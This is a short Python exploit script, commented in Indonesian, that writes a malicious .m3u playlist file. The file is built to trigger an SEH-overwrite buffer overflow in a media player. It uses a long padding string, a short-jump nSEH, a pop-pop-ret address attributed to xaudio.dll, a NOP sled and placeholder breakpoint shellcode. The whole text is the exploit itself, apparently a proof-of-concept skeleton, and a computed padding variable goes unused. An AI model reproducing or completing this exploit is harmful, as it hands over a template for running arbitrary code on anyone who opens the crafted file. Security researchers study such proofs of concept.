#!/usr/bin/python

import struct

total = 5010
bug = "http:"+"\x2f\x2f"
junk = bug+"\x41" * 4103	# awal dari nSEH
nSEH = "\xeb\x1e\x90\x90"	# lompat 30 bytes
SEH = struct.pack('<L', 0x1001fabe)	# pop pop ret dari xaudio.dll
nops = "\x90" * 24
shellcode = "\xcc\xcc\xcc\xcc"
junk2 = "D" * (total - len(junk+nSEH+SEH))
payload = junk+nSEH+SEH+nops+shellcode

f = open('lagu-skeleton4.m3u', 'w')
f.write(payload)
f.close()
